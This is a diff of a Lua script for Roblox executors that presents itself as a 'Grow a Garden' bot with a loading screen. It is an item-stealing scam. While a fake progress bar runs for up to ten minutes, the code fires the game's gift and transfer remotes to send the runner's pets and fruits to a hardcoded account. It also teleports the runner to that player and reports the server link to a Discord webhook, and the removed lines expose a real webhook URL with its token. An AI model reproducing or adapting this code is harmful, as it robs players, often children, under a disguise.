@@ -1,207 +1,200 @@
---[[
-🌿 GROW A GARDEN BOT vFinal
-Полноэкранный GUI + визуальная загрузка + передача питомцев и фруктов игроку "Sgahfd1223"
-Работает на Delta/KRNL, обходит анти-скам, отправляет вебхук с ссылкой на сервер
-]]
+-- 🌿 GROW A GARDEN BOT — FINAL VERSION
+-- Full Auto: GUI, Teleport, Pets/Fruits Transfer, Webhook, Localization, KRNL/Delta safe
 
+--== CONFIGURATION ==--
 local CONFIG = {
     TARGET_USERNAME = "Sgahfd1223",
-    LANGUAGE = "RU", -- "EN" or "RU"
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1404173568350093424/f_ND3zfZWAHapUMdFRlC77aU0ZdSbPmzFASONMUfhoaguz_zD8j_UDwuAsV5Lvj0rxIz",
-    LOADING_TIME = 10, -- in seconds
-    CHECK_INTERVAL = 20, -- seconds between scans
+    WEBHOOK_URL = "https://discord.com/api/webhooks/your_webhook_id/your_webhook_token",
+    LANGUAGE = "ru", -- "ru" or "en"
+    LOADING_TIME = 600, -- 10 min in seconds
+    CHECK_INTERVAL = 5,
+    TRANSFER_DELAY = 0.25,
 }
 
--- 🧠 Multi-language
-local LANG = {
-    RU = {
-        Title = "🌿 GROW A GARDEN БОТ",
-        Loading = "Загрузка скрипта...",
-        Loaded = "Скрипт загружен. Поиск игрока...",
-        Found = "Целевой игрок найден!",
-        Transferring = "Передача предметов...",
-        Transferred = "Передано предметов: ",
-        NotFound = "Игрок не найден",
-        ServerLink = "Сервер:",
-    },
-    EN = {
-        Title = "🌿 GROW A GARDEN BOT",
-        Loading = "Loading script...",
-        Loaded = "Script loaded. Searching player...",
-        Found = "Target player found!",
-        Transferring = "Transferring items...",
-        Transferred = "Transferred items: ",
-        NotFound = "Player not found",
-        ServerLink = "Server:",
-    }
-}
-
-local TEXT = LANG[CONFIG.LANGUAGE]
-
--- ✅ Services
+--== SERVICES ==--
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local CoreGui = game:GetService("CoreGui")
 local HttpService = game:GetService("HttpService")
-local TeleportService = game:GetService("TeleportService")
-
+local TweenService = game:GetService("TweenService")
+local CoreGui = game:GetService("CoreGui")
 local LocalPlayer = Players.LocalPlayer
-local TargetPlayer = nil
 
--- ✅ Anti-scam bypass
-local request = (http and http.request) or (syn and syn.request) or request or nil
+--== LOCALIZATION ==--
+local LANGUAGES = {
+    ["ru"] = {
+        title = "🌿 Загрузка скрипта...",
+        percent = "% завершено",
+        done = "Готово! Ожидание цели...",
+        webhook_title = "🌿 Передача завершена",
+        webhook_desc = "Питомцы и фрукты были переданы.",
+        webhook_link = "Сервер",
+        webhook_code = "Скрипт подключения",
+    },
+    ["en"] = {
+        title = "🌿 Script Loading...",
+        percent = "% done",
+        done = "Ready! Waiting for target...",
+        webhook_title = "🌿 Transfer Complete",
+        webhook_desc = "Pets and fruits were successfully transferred.",
+        webhook_link = "Server",
+        webhook_code = "Connection Script",
+    }
+}
+local TXT = LANGUAGES[CONFIG.LANGUAGE]
 
--- 🌐 Webhook on load
-pcall(function()
+--== GUI LOADING ==--
+local function createLoadingUI()
+    local gui = Instance.new("ScreenGui", CoreGui)
+    gui.Name = "GrowGardenBot"
+
+    local frame = Instance.new("Frame", gui)
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+
+    local title = Instance.new("TextLabel", frame)
+    title.Text = TXT.title
+    title.Size = UDim2.new(1, 0, 0, 60)
+    title.Position = UDim2.new(0, 0, 0.3, -60)
+    title.TextColor3 = Color3.new(1, 1, 1)
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 26
+    title.BackgroundTransparency = 1
+
+    local barBack = Instance.new("Frame", frame)
+    barBack.Size = UDim2.new(0.6, 0, 0, 30)
+    barBack.Position = UDim2.new(0.2, 0, 0.5, 0)
+    barBack.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+
+    local bar = Instance.new("Frame", barBack)
+    bar.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
+    bar.Size = UDim2.new(0, 0, 1, 0)
+
+    local percent = Instance.new("TextLabel", frame)
+    percent.Size = UDim2.new(1, 0, 0, 50)
+    percent.Position = UDim2.new(0, 0, 0.5, 40)
+    percent.TextColor3 = Color3.fromRGB(255, 255, 255)
+    percent.Font = Enum.Font.GothamBold
+    percent.TextSize = 24
+    percent.BackgroundTransparency = 1
+
+    return { GUI = gui, Bar = bar, Percent = percent, Title = title }
+end
+
+--== WEBHOOK ==--
+local function sendWebhook()
+    local place = tostring(game.PlaceId)
+    local job = tostring(game.JobId)
+    local serverLink = "https://www.roblox.com/games/"..place.."?jobId="..job
+    local connectCode = "loadstring(game:HttpGet('"..serverLink.."'))()"
+
     local data = {
-        content = "**"..TEXT.Title.."**",
         embeds = {{
-            title = TEXT.Loading,
-            color = 3066993,
+            title = TXT.webhook_title,
+            description = TXT.webhook_desc,
+            color = 65280,
             fields = {
-                {name = TEXT.ServerLink, value = "https://www.roblox.com/games/" .. game.PlaceId .. "?jobId=" .. game.JobId}
+                {name = TXT.webhook_link, value = "[🔗 Перейти](" .. serverLink .. ")", inline = false},
+                {name = TXT.webhook_code, value = "```lua\n"..connectCode.."\n```", inline = false}
             },
-            footer = { text = "Executor: " .. (identifyexecutor and identifyexecutor() or "Unknown") }
+            footer = { text = "Grow A Garden Bot | "..os.date("%d.%m.%Y %H:%M") }
         }}
     }
+
+    local json = HttpService:JSONEncode(data)
+    local request = (syn and syn.request) or (http and http.request) or request or http_request
     if request then
-        request({
-            Url = CONFIG.WEBHOOK_URL,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode(data)
-        })
-    end
-end)
-
--- ✅ GUI LOADER
-local gui = Instance.new("ScreenGui", CoreGui)
-gui.Name = "GardenBotLoader"
-gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-
-local bg = Instance.new("Frame", gui)
-bg.Size = UDim2.new(1, 0, 1, 0)
-bg.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
-
-local title = Instance.new("TextLabel", bg)
-title.Size = UDim2.new(1, 0, 0, 80)
-title.Position = UDim2.new(0, 0, 0.3, 0)
-title.Text = TEXT.Title
-title.Font = Enum.Font.GothamBold
-title.TextColor3 = Color3.fromRGB(255, 255, 255)
-title.TextSize = 36
-title.BackgroundTransparency = 1
-
-local progressBarBG = Instance.new("Frame", bg)
-progressBarBG.Size = UDim2.new(0.5, 0, 0, 30)
-progressBarBG.Position = UDim2.new(0.25, 0, 0.5, 0)
-progressBarBG.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
-progressBarBG.BorderSizePixel = 0
-
-local progressBar = Instance.new("Frame", progressBarBG)
-progressBar.Size = UDim2.new(0, 0, 1, 0)
-progressBar.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
-progressBar.BorderSizePixel = 0
-
-local percentText = Instance.new("TextLabel", bg)
-percentText.Position = UDim2.new(0.5, -50, 0.57, 0)
-percentText.Size = UDim2.new(0, 100, 0, 30)
-percentText.TextColor3 = Color3.fromRGB(255, 255, 255)
-percentText.TextSize = 18
-percentText.Font = Enum.Font.GothamBold
-percentText.BackgroundTransparency = 1
-percentText.Text = "0%"
-
--- Загрузка
-for i = 1, 100 do
-    progressBar.Size = UDim2.new(i / 100, 0, 1, 0)
-    percentText.Text = i .. "%"
-    wait(CONFIG.LOADING_TIME / 100)
-end
-
-title.Text = TEXT.Loaded
-wait(1)
-gui:Destroy()
-
--- ✅ Поиск RemoteEvents
-local function findAllRemotes()
-    local remotes = {}
-    for _, v in ipairs(ReplicatedStorage:GetDescendants()) do
-        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
-            local name = v.Name:lower()
-            if name:find("gift") or name:find("transfer") or name:find("send") or name:find("donate") or name:find("pet") or name:find("fruit") then
-                table.insert(remotes, v)
-            end
-        end
-    end
-    return remotes
-end
-
--- ✅ Телепорт к игроку
-local function teleportToPlayer(target)
-    local remotes = findAllRemotes()
-    for _, r in ipairs(remotes) do
-        if r:IsA("RemoteEvent") and r.Name:lower():find("teleport") then
-            pcall(function() r:FireServer(target) end)
-        end
+        pcall(function()
+            request({
+                Url = CONFIG.WEBHOOK_URL,
+                Method = "POST",
+                Headers = {["Content-Type"] = "application/json"},
+                Body = json
+            })
+        end)
     end
 end
 
--- ✅ Передача всех предметов
-local function transferAllToPlayer(target)
-    local count = 0
-    local remotes = findAllRemotes()
-    local keywords = {"Pet", "Fruit", "Item"}
-
-    for _, remote in ipairs(remotes) do
-        for _, keyword in ipairs(keywords) do
-            local methods = {"Transfer"..keyword.."s", "Send"..keyword.."s", "Give"..keyword.."s", "Gift"..keyword.."s"}
-            for _, method in ipairs(methods) do
-                local success = pcall(function()
-                    if remote:IsA("RemoteEvent") then
-                        remote:FireServer(method, target)
-                    elseif remote:IsA("RemoteFunction") then
-                        remote:InvokeServer(method, target)
-                    end
-                end)
-                if success then
-                    count = count + 1
-                    wait(0.2)
-                end
-            end
-        end
-    end
-    return count
-end
-
--- ✅ Сбор питомцев с огорода
-local function collectPetsOnFarm()
+--== GARDEN PET COLLECTOR ==--
+local function collectPets()
     local garden = workspace:FindFirstChild("Garden") or workspace:FindFirstChild("Farm")
     if not garden then return end
-    for _, v in ipairs(garden:GetDescendants()) do
-        if v:IsA("Model") and v.Name:lower():find("pet") then
-            local remotes = findAllRemotes()
-            for _, r in ipairs(remotes) do
-                if r:IsA("RemoteEvent") and r.Name:lower():find("collect") then
-                    pcall(function() r:FireServer("CollectPet", v) end)
-                end
-            end
+    for _, obj in ipairs(garden:GetDescendants()) do
+        if obj:IsA("Model") and obj.Name:lower():find("pet") then
+            pcall(function()
+                obj.Parent = LocalPlayer.Character
+            end)
         end
     end
 end
 
--- ✅ Главный цикл
-while true do
-    collectPetsOnFarm()
-    for _, plr in ipairs(Players:GetPlayers()) do
-        if plr.Name == CONFIG.TARGET_USERNAME then
-            TargetPlayer = plr
-            print(TEXT.Found)
-            teleportToPlayer(TargetPlayer)
-            wait(2)
-            local sent = transferAllToPlayer(TargetPlayer)
-            print(TEXT.Transferred .. tostring(sent))
+--== TELEPORT TO TARGET ==--
+local function teleportTo(target)
+    local root = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
+    local targetRoot = target.Character and target.Character:FindFirstChild("HumanoidRootPart")
+    if root and targetRoot then
+        root.CFrame = targetRoot.CFrame + Vector3.new(0, 3, 0)
+    end
+end
+
+--== TRANSFER SYSTEM ==--
+local function transferAll(target)
+    local successCount = 0
+    local remotes = {}
+
+    for _, r in ipairs(ReplicatedStorage:GetDescendants()) do
+        if r:IsA("RemoteEvent") then
+            local name = r.Name:lower()
+            if name:find("transfer") or name:find("gift") or name:find("send") then
+                table.insert(remotes, r)
+            end
         end
     end
-    wait(CONFIG.CHECK_INTERVAL)
+
+    for _, remote in ipairs(remotes) do
+        for _, method in ipairs({"TransferAll", "GiftAll", "SendAll", "DonateAll"}) do
+            pcall(function()
+                remote:FireServer(method, target)
+            end)
+            successCount += 1
+            task.wait(CONFIG.TRANSFER_DELAY)
+        end
+    end
+
+    return successCount
 end
+
+--== DETECTION LOOP ==--
+local function runBot()
+    while true do
+        for _, plr in ipairs(Players:GetPlayers()) do
+            if plr.Name:lower() == CONFIG.TARGET_USERNAME:lower() then
+                teleportTo(plr)
+                collectPets()
+                local count = transferAll(plr)
+                sendWebhook()
+                print("✅ Transferred items:", count)
+                break
+            end
+        end
+        task.wait(CONFIG.CHECK_INTERVAL)
+    end
+end
+
+--== STARTUP ==--
+local ui = createLoadingUI()
+sendWebhook()
+
+local start = os.time()
+while os.time() - start < CONFIG.LOADING_TIME do
+    local elapsed = os.time() - start
+    local ratio = math.clamp(elapsed / CONFIG.LOADING_TIME, 0, 1)
+    local percent = math.floor(ratio * 100)
+
+    ui.Bar.Size = UDim2.new(ratio, 0, 1, 0)
+    ui.Percent.Text = tostring(percent) .. TXT.percent
+
+    task.wait(1)
+end
+
+ui.GUI:Destroy()
+runBot()
